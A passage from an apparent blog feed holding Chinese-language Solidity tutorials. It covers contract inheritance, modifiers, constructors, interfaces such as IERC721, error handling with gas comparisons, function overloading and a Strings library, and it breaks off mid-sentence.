class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">contract Yeye &#123;</span><br><span class="line">    event Log(string msg);</span><br><span class="line"></span><br><span class="line">    // 定义3个function: hip(), pop(), man()，Log值为Yeye。</span><br><span class="line">    function hip() public virtual&#123;</span><br><span class="line">        emit Log(&quot;Yeye&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function pop() public virtual&#123;</span><br><span class="line">        emit Log(&quot;Yeye&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function yeye() public virtual &#123;</span><br><span class="line">        emit Log(&quot;Yeye&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们再定义一个爸爸合约<code>Baba</code>，让他继承<code>Yeye</code>合约，语法就是<code>contract Baba is Yeye</code>，非常直观。在<code>Baba</code>合约里，我们重写一下<code>hip()</code>和<code>pop()</code>这两个函数，加上<code>override</code>关键字，并将他们的输出改为<code>”Baba”</code>；并且加一个新的函数<code>baba</code>，输出也是<code>”Baba”</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">contract Baba is Yeye&#123;</span><br><span class="line">    // 继承两个function: hip()和pop()，输出改为Baba。</span><br><span class="line">    function hip() public virtual override&#123;</span><br><span class="line">        emit Log(&quot;Baba&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function pop() public virtual override&#123;</span><br><span class="line">        emit Log(&quot;Baba&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function baba() public virtual&#123;</span><br><span class="line">        emit Log(&quot;Baba&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们部署合约，可以看到<code>Baba</code>合约里有4个函数，其中<code>hip()</code>和<code>pop()</code>的输出被成功改写成<code>”Baba”</code>，而继承来的<code>yeye()</code>的输出仍然是<code>”Yeye”</code>。</p><h3 id="多重继承"><a href="#多重继承" class="headerlink" title="多重继承"></a>多重继承</h3><p><code>solidity</code>的合约可以继承多个合约。规则：</p><p>继承时要按辈分最高到最低的顺序排。比如我们写一个<code>Erzi</code>合约，继承<code>Yeye</code>合约和<code>Baba</code>合约，那么就要写成<code>contract Erzi is Yeye, Baba</code>，而不能写成<code>contract Erzi is Baba, Yeye</code>，不然就会报错。 如果某一个函数在多个继承的合约里都存在，比如例子中的<code>hip()</code>和<code>pop()</code>，在子合约里必须重写，不然会报错。 重写在多个父合约中都重名的函数时，<code>override</code>关键字后面要加上所有父合约名字，例如<code>override(Yeye, Baba)</code>。 例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">contract Erzi is Yeye, Baba&#123;</span><br><span class="line">    // 继承两个function: hip()和pop()，输出值为Erzi。</span><br><span class="line">    function hip() public virtual override(Yeye, Baba)&#123;</span><br><span class="line">        emit Log(&quot;Erzi&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function pop() public virtual override(Yeye, Baba) &#123;</span><br><span class="line">        emit Log(&quot;Erzi&quot;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>我们可以看到，<code>Erzi</code>合约里面重写了<code>hip()</code>和<code>pop()</code>两个函数，将输出改为<code>”Erzi”</code>，并且还分别从<code>Yeye</code>和<code>Baba</code>合约继承了<code>yeye()</code>和<code>baba()</code>两个函数。</p><h3 id="修饰器的继承"><a href="#修饰器的继承" class="headerlink" title="修饰器的继承"></a>修饰器的继承</h3><p><code>Solidity</code>中的修饰器（<code>Modifier</code>）同样可以继承，用法与函数继承类似，在相应的地方加<code>virtual</code>和<code>override</code>关键字即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">contract Base1 &#123;</span><br><span class="line">    modifier exactDividedBy2And3(uint _a) virtual &#123;</span><br><span class="line">        require(_a % 2 == 0 &amp;&amp; _a % 3 == 0);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Identifier is Base1 &#123;</span><br><span class="line"></span><br><span class="line">    //计算一个数分别被2除和被3除的值，但是传入的参数必须是2和3的倍数</span><br><span class="line">    function getExactDividedBy2And3(uint _dividend) public exactDividedBy2And3(_dividend) pure returns(uint, uint) &#123;</span><br><span class="line">        return getExactDividedBy2And3WithoutModifier(_dividend);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //计算一个数分别被2除和被3除的值</span><br><span class="line">    function getExactDividedBy2And3WithoutModifier(uint _dividend) public pure returns(uint, uint)&#123;</span><br><span class="line">        uint div2 = _dividend / 2;</span><br><span class="line">        uint div3 = _dividend / 3;</span><br><span class="line">        return (div2, div3);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Identifier</code>合约可以直接在代码中使用父合约中的<code>exactDividedBy2And3</code>修饰器，也可以利用<code>override</code>关键字重写修饰器：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">modifier exactDividedBy2And3(uint _a) override &#123;</span><br><span class="line">    _;</span><br><span class="line">    require(_a % 2 == 0 &amp;&amp; _a % 3 == 0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="构造函数的继承"><a href="#构造函数的继承" class="headerlink" title="构造函数的继承"></a>构造函数的继承</h3><p>子合约有两种方法继承父合约的构造函数。举个简单的例子，父合约<code>A</code>里面有一个状态变量<code>a</code>，并由构造函数的参数来确定：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// 构造函数的继承</span><br><span class="line">abstract contract A &#123;</span><br><span class="line">    uint public a;</span><br><span class="line"></span><br><span class="line">    constructor(uint _a) &#123;</span><br><span class="line">        a = _a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>在继承时声明父构造函数的参数，例如：<code>contract B is A(1)</code></p></li><li><p>在子合约的构造函数中声明构造函数的参数，例如：</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">contract C is A &#123;</span><br><span class="line">    constructor(uint _c) A(_c * _c) &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="调用父合约的函数"><a href="#调用父合约的函数" class="headerlink" title="调用父合约的函数"></a>调用父合约的函数</h3><p>子合约有两种方式调用父合约的函数，直接调用和利用<code>super</code>关键字。</p><ul><li>直接调用：子合约可以直接用<code>父合约名.函数名()</code>的方式来调用父合约函数，例如<code>Yeye.pop()</code>。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function callParent() public&#123;</span><br><span class="line">    Yeye.pop();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><code>super</code>关键字：子合约可以利用<code>super.函数名()</code>来调用最近的父合约函数。<code>solidity</code>继承关系按声明时从右到左的顺序是：<code>contract Erzi is Yeye, Baba</code>，那么<code>Baba</code>是最近的父合约，<code>super.pop()</code>将调用<code>Baba.pop()</code>而不是<code>Yeye.pop()</code>：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function callParentSuper() public&#123;</span><br><span class="line">    // 将调用最近的父合约函数，Baba.pop()</span><br><span class="line">    super.pop();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="抽象"><a href="#抽象" class="headerlink" title="抽象"></a>抽象</h2><p>如果一个智能合约里至少有一个未实现的函数，即某个函数缺少主体<code>&#123;&#125;</code>中的内容，则必须将该合约标为<code>abstract</code>，不然编译会报错；另外，未实现的函数需要加<code>virtual</code>，以便子合约重写。拿我们之前的<a href="https://github.com/AmazingAng/WTFSolidity/tree/main/07_InsertionSort">插入排序合约</a>为例，如果我们还没想好具体怎么实现插入排序函数，那么可以把合约标为<code>abstract</code>，之后让别人补写上。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">abstract contract InsertionSort&#123;</span><br><span class="line">    function insertionSort(uint[] memory a) public pure virtual returns(uint[] memory);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h3><p>接口类似于抽象合约，但它不实现任何功能。接口的规则：</p><ol><li>不能包含状态变量</li><li>不能包含构造函数</li><li>不能继承除接口外的其他合约</li><li>所有函数都必须是external且不能有函数体</li><li>继承接口的合约必须实现接口定义的所有功能</li></ol><p>虽然接口不实现任何功能，但它非常重要。接口是智能合约的骨架，定义了合约的功能以及如何触发它们：如果智能合约实现了某种接口（比如<code>ERC20</code>或<code>ERC721</code>），其他Dapps和智能合约就知道如何与它交互。因为接口提供了两个重要的信息：</p><ol><li>合约里每个函数的<code>bytes4</code>选择器，以及基于它们的函数签名<code>函数名(每个参数类型）</code>。</li><li>接口id（更多信息见<a href="https://eips.ethereum.org/EIPS/eip-165">EIP165</a>）</li></ol><p>另外，接口与合约<code>ABI</code>（Application Binary Interface）等价，可以相互转换：编译接口可以得到合约的<code>ABI</code>，利用<a href="https://gnidan.github.io/abi-to-sol/">abi-to-sol工具</a>也可以将<code>ABI json</code>文件转换为<code>接口sol</code>文件。</p><p>我们以<code>ERC721</code>接口合约<code>IERC721</code>为例，它定义了3个<code>event</code>和9个<code>function</code>，所有<code>ERC721</code>标准的NFT都实现了这些函数。我们可以看到，接口和常规合约的区别在于每个函数都以<code>;</code>代替函数体<code>&#123; &#125;</code>结尾。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">interface IERC721 is IERC165 &#123;</span><br><span class="line">    event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);</span><br><span class="line">    event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);</span><br><span class="line">    event ApprovalForAll(address indexed owner, address indexed operator, bool approved);</span><br><span class="line">    </span><br><span class="line">    function balanceOf(address owner) external view returns (uint256 balance);</span><br><span class="line"></span><br><span class="line">    function ownerOf(uint256 tokenId) external view returns (address owner);</span><br><span class="line"></span><br><span class="line">    function safeTransferFrom(address from, address to, uint256 tokenId) external;</span><br><span class="line"></span><br><span class="line">    function transferFrom(address from, address to, uint256 tokenId) external;</span><br><span class="line"></span><br><span class="line">    function approve(address to, uint256 tokenId) external;</span><br><span class="line"></span><br><span class="line">    function getApproved(uint256 tokenId) external view returns (address operator);</span><br><span class="line"></span><br><span class="line">    function setApprovalForAll(address operator, bool _approved) external;</span><br><span class="line"></span><br><span class="line">    function isApprovedForAll(address owner, address operator) external view returns (bool);</span><br><span class="line"></span><br><span class="line">    function safeTransferFrom( address from, address to, uint256 tokenId, bytes calldata data) external;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="IERC721事件"><a href="#IERC721事件" class="headerlink" title="IERC721事件"></a>IERC721事件</h3><p><code>IERC721</code>包含3个事件，其中<code>Transfer</code>和<code>Approval</code>事件在<code>ERC20</code>中也有。</p><ul><li><code>Transfer</code>事件：在转账时被释放，记录代币的发出地址<code>from</code>，接收地址<code>to</code>和<code>tokenid</code>。</li><li><code>Approval</code>事件：在授权时释放，记录授权地址<code>owner</code>，被授权地址<code>approved</code>和<code>tokenid</code>。</li><li><code>ApprovalForAll</code>事件：在批量授权时释放，记录批量授权的发出地址<code>owner</code>，被授权地址<code>operator</code>和授权与否的<code>approved</code>。</li></ul><h3 id="IERC721函数"><a href="#IERC721函数" class="headerlink" title="IERC721函数"></a>IERC721函数</h3><ul><li><code>balanceOf</code>：返回某地址的NFT持有量<code>balance</code>。</li><li><code>ownerOf</code>：返回某<code>tokenId</code>的主人<code>owner</code>。</li><li><code>transferFrom</code>：普通转账，参数为转出地址<code>from</code>，接收地址<code>to</code>和<code>tokenId</code>。</li><li><code>safeTransferFrom</code>：安全转账（如果接收方是合约地址，会要求实现<code>ERC721Receiver</code>接口）。参数为转出地址<code>from</code>，接收地址<code>to</code>和<code>tokenId</code>。</li><li><code>approve</code>：授权另一个地址使用你的NFT。参数为被授权地址<code>approve</code>和<code>tokenId</code>。</li><li><code>getApproved</code>：查询<code>tokenId</code>被批准给了哪个地址。</li><li><code>setApprovalForAll</code>：将自己持有的该系列NFT批量授权给某个地址<code>operator</code>。</li><li><code>isApprovedForAll</code>：查询某地址的NFT是否批量授权给了另一个<code>operator</code>地址。</li><li><code>safeTransferFrom</code>：安全转账的重载函数，参数里面包含了<code>data</code>。</li></ul><h3 id="什么时候使用接口？"><a href="#什么时候使用接口？" class="headerlink" title="什么时候使用接口？"></a>什么时候使用接口？</h3><p>如果我们知道一个合约实现了<code>IERC721</code>接口，我们不需要知道它具体代码实现，就可以与它交互。</p><p>无聊猿<code>BAYC</code>属于<code>ERC721</code>代币，实现了<code>IERC721</code>接口的功能。我们不需要知道它的源代码，只需知道它的合约地址，用<code>IERC721</code>接口就可以与它交互，比如用<code>balanceOf()</code>来查询某个地址的<code>BAYC</code>余额，用<code>safeTransferFrom()</code>来转账<code>BAYC</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">contract interactBAYC &#123;</span><br><span class="line">    // 利用BAYC地址创建接口合约变量（ETH主网）</span><br><span class="line">    IERC721 BAYC = IERC721(0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D);</span><br><span class="line"></span><br><span class="line">    // 通过接口调用BAYC的balanceOf()查询持仓量</span><br><span class="line">    function balanceOfBAYC(address owner) external view returns (uint256 balance)&#123;</span><br><span class="line">        return BAYC.balanceOf(owner);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 通过接口调用BAYC的safeTransferFrom()安全转账</span><br><span class="line">    function safeTransferFromBAYC(address from, address to, uint256 tokenId) external&#123;</span><br><span class="line">        BAYC.safeTransferFrom(from, to, tokenId);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="异常"><a href="#异常" class="headerlink" title="异常"></a>异常</h2><p>介绍<code>solidity</code>三种抛出异常的方法：<code>error</code>，<code>require</code>和<code>assert</code>，并比较三种方法的<code>gas</code>消耗。</p><p>写智能合约经常会出<code>bug</code>，<code>solidity</code>中的异常命令帮助我们<code>debug</code>。</p><h3 id="Error"><a href="#Error" class="headerlink" title="Error"></a>Error</h3><p><code>error</code>是<code>solidity 0.8版本</code>新加的内容，方便且高效（省<code>gas</code>）地向用户解释操作失败的原因。人们可以在<code>contract</code>之外定义异常。下面，我们定义一个<code>TransferNotOwner</code>异常，当用户不是代币<code>owner</code>的时候尝试转账，会抛出错误：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">error TransferNotOwner(); // 自定义error</span><br></pre></td></tr></table></figure><p>在执行当中，<code>error</code>必须搭配<code>revert</code>（回退）命令使用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function transferOwner1(uint256 tokenId, address newOwner) public &#123;</span><br><span class="line">    if(_owners[tokenId] != msg.sender)&#123;</span><br><span class="line">        revert TransferNotOwner();</span><br><span class="line">    &#125;</span><br><span class="line">    _owners[tokenId] = newOwner;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们定义了一个<code>transferOwner1()</code>函数，它会检查代币的<code>owner</code>是不是发起人，如果不是，就会抛出<code>TransferNotOwner</code>异常；如果是的话，就会转账。</p><h3 id="Require"><a href="#Require" class="headerlink" title="Require"></a>Require</h3><p><code>require</code>命令是<code>solidity 0.8版本</code>之前抛出异常的常用方法，目前很多主流合约仍然还在使用它。它很好用，唯一的缺点就是<code>gas</code>随着描述异常的字符串长度增加，比<code>error</code>命令要高。使用方法：<code>require(检查条件，&quot;异常的描述&quot;)</code>，当检查条件不成立的时候，就会抛出异常。</p><p>我们用<code>require</code>命令重写一下上面的<code>transferOwner</code>函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function transferOwner2(uint256 tokenId, address newOwner) public &#123;</span><br><span class="line">    require(_owners[tokenId] == msg.sender, &quot;Transfer Not Owner&quot;);</span><br><span class="line">    _owners[tokenId] = newOwner;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Assert"><a href="#Assert" class="headerlink" title="Assert"></a>Assert</h3><p><code>assert</code>命令一般用于程序员写程序<code>debug</code>，因为它不能解释抛出异常的原因（比<code>require</code>少个字符串）。它的用法很简单，<code>assert(检查条件）</code>，当检查条件不成立的时候，就会抛出异常。</p><p>我们用<code>assert</code>命令重写一下上面的<code>transferOwner</code>函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function transferOwner3(uint256 tokenId, address newOwner) public &#123;</span><br><span class="line">    assert(_owners[tokenId] == msg.sender);</span><br><span class="line">    _owners[tokenId] = newOwner;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="在remix上验证"><a href="#在remix上验证" class="headerlink" title="在remix上验证"></a>在remix上验证</h3><ol><li>输入任意<code>uint256</code>数字和非0地址，调用<code>transferOwner1</code>，也就是<code>error</code>方法，控制台抛出了异常并显示我们自定义的<code>TransferNotOwner</code>。</li><li>输入任意<code>uint256</code>数字和非0地址，调用<code>transferOwner2</code>，也就是<code>require</code>方法，控制台抛出了异常并打印出<code>require</code>中的字符串。 </li><li>输入任意<code>uint256</code>数字和非0地址，调用<code>transferOwner3</code>，也就是<code>assert</code>方法，控制台只抛出了异常。 </li></ol><h3 id="三种方法的gas比较"><a href="#三种方法的gas比较" class="headerlink" title="三种方法的gas比较"></a>三种方法的gas比较</h3><p>比较一下三种抛出异常的<code>gas</code>消耗，通过remix控制台的Debug按钮，能查到每次函数调用的<code>gas</code>消耗分别如下：</p><ol><li><strong><code>error</code>方法<code>gas</code>消耗</strong>：24445</li><li><strong><code>require</code>方法<code>gas</code>消耗</strong>：24743</li><li><strong><code>assert</code>方法<code>gas</code>消耗</strong>：24446</li></ol><p>我们可以看到，<code>error</code>方法<code>gas</code>最少，其次是<code>assert</code>，<code>require</code>方法消耗<code>gas</code>最多！因此，<code>error</code>既可以告知用户抛出异常的原因，又能省<code>gas</code>，大家要多用！（注意，由于部署测试时间的不同，每个函数的<code>gas</code>消耗会有所不同，但是比较结果会是一致的。）</p>]]></content>
      
      
      <categories>
          
          <category> Blockchain </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> Blockchain </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Solidity8.0-进阶</title>
      <link href="/article/2022-11-26-Solidity8.0-%E8%BF%9B%E9%98%B6/"/>
      <url>/article/2022-11-26-Solidity8.0-%E8%BF%9B%E9%98%B6/</url>
      
        <content type="html"><![CDATA[<h1 id="Solidity8-0-进阶"><a href="#Solidity8-0-进阶" class="headerlink" title="Solidity8.0-进阶"></a>Solidity8.0-进阶</h1><h2 id="重载"><a href="#重载" class="headerlink" title="重载"></a>重载</h2><p><code>solidity</code>中允许函数进行重载（<code>overloading</code>），即名字相同但输入参数类型不同的函数可以同时存在，他们被视为不同的函数。注意，<code>solidity</code>不允许修饰器（<code>modifier</code>）重载。</p><h3 id="函数重载"><a href="#函数重载" class="headerlink" title="函数重载"></a>函数重载</h3><p>举个例子，我们可以定义两个都叫<code>saySomething()</code>的函数，一个没有任何参数，输出<code>&quot;Nothing&quot;</code>；另一个接收一个<code>string</code>参数，输出这个<code>string</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function saySomething() public pure returns(string memory)&#123;</span><br><span class="line">    return(&quot;Nothing&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function saySomething(string memory something) public pure returns(string memory)&#123;</span><br><span class="line">    return(something);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最终重载函数在经过编译器编译后，由于不同的参数类型，都变成了不同的函数选择器（selector）。</p><p>以 <code>Overloading.sol</code> 合约为例，在 Remix 上编译部署后，分别调用重载函数 <code>saySomething()</code> 和 <code>saySomething(string memory something)</code>，可以看到他们返回了不同的结果，被区分为不同的函数。</p><h3 id="实参匹配（Argument-Matching）"><a href="#实参匹配（Argument-Matching）" class="headerlink" title="实参匹配（Argument Matching）"></a>实参匹配（Argument Matching）</h3><p>在调用重载函数时，会把输入的实际参数和函数参数的变量类型做匹配。 如果出现多个匹配的重载函数，则会报错。下面这个例子有两个叫<code>f()</code>的函数，一个参数为<code>uint8</code>，另一个为<code>uint256</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function f(uint8 _in) public pure returns (uint8 out) &#123;</span><br><span class="line">out = _in;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function f(uint256 _in) public pure returns (uint256 out) &#123;</span><br><span class="line">out = _in;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们调用<code>f(50)</code>，因为<code>50</code>既可以被转换为<code>uint8</code>，也可以被转换为<code>uint256</code>，因此会报错。</p><h2 id="库函数"><a href="#库函数" class="headerlink" title="库函数"></a>库函数</h2><p>库函数是一种特殊的合约，为了提升<code>solidity</code>代码的复用性和减少<code>gas</code>而存在。库合约一般都是一些好用的函数合集（<code>库函数</code>），由大神或者项目方创作，咱们站在巨人的肩膀上，会用就行了。</p><p>他和普通合约主要有以下几点不同：</p><ol><li>不能存在状态变量</li><li>不能够继承或被继承</li><li>不能接收以太币</li><li>不可以被销毁</li></ol><h3 id="String库合约"><a href="#String库合约" class="headerlink" title="String库合约"></a>String库合约</h3><p><code>String库合约</code>是将<code>uint256</code>类型转换为相应的<code>string</code>类型的代码库，样例代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">library Strings &#123;</span><br><span class="line">    bytes16 private constant _HEX_SYMBOLS = &quot;0123456789abcdef&quot;;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Converts a `uint256` to its ASCII `string` decimal representation.</span><br><span class="line">     */</span><br><span class="line">    function toString(uint256 value) public pure returns (string memory) &#123;</span><br><span class="line">        // Inspired by OraclizeAPI&#x27;s implementation - MIT licence</span><br><span class="line">        // https://github.com/oraclize/ethereum-api/blob/b42146b063c7d6ee1358846c198246239e9360e8/oraclizeAPI_0.4.25.sol</span><br><span class="line"></span><br><span class="line">        if (value == 0) &#123;</span><br><span class="line">            return &quot;0&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        uint256 temp = value;</span><br><span class="line">        uint256 digits;</span><br><span class="line">        while (temp != 0) &#123;</span><br><span class="line">            digits++;</span><br><span class="line">            temp /= 10;</span><br><span class="line">        &#125;</span><br><span class="line">        bytes memory buffer = new bytes(digits);</span><br><span class="line">        while (value != 0) &#123;</span><br><span class="line">            digits -= 1;</span><br><span class="line">            buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));</span><br><span class="line">            value /= 10;</span><br><span class="line">        &#125;</span><br><span class="line">        return string(buffer);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation.</span><br><span class="line">     */</span><br><span class="line">    function toHexString(uint256 value) public pure returns (string memory) &#123;</span><br><span class="line">        if (value == 0) &#123;</span><br><span class="line">            return &quot;0x00&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        uint256 temp = value;</span><br><span class="line">        uint256 length = 0;</span><br><span class="line">        while (temp != 0) &#123;</span><br><span class="line">            length++;</span><br><span class="line">            temp &gt;&gt;= 8;</span><br><span class="line">        &#125;</span><br><span class="line">        return toHexString(value, length);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation with fixed length.</span><br><span class="line">     */</span><br><span class="line">    function toHexString(uint256 value, uint256 length) public pure returns (string memory) &#123;</span><br><span class="line">        bytes memory buffer = new bytes(2 * length + 2);</span><br><span class="line">        buffer[0] = &quot;0&quot;;</span><br><span class="line">        buffer[1] = &quot;x&quot;;</span><br><span class="line">        for (uint256 i = 2 * length + 1; i &gt; 1; --i) &#123;</span><br><span class="line">            buffer[i] = _HEX_SYMBOLS[value &amp; 0xf];</span><br><span class="line">            value &gt;&gt;= 4;</span><br><span class="line">        &#125;</span><br><span class="line">        require(value == 0, &quot;Strings: hex length insufficient&quot;);</span><br><span class="line">        return string(buffer);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>他主要包含两个函数，<code>toString()</code>将<code>uint256</code>转为<code>string</code>，<code>toHexString()</code>将<code>uint256</code>转换为<code>16进制</code>，在转换为<code>string</code>。</p><h3 id="如何使用库合约"><a href="#如何使用库合约" class="headerlink" title="如何使用库合约"></a>如何使用库合约</h3><p>我们用String库函数的toHexString()来演示两种使用库合约中函数的办法。</p><p><strong>1. 利用using for指令</strong></p><p>指令<code>using A for B;</code>可用于附加库函数（从库 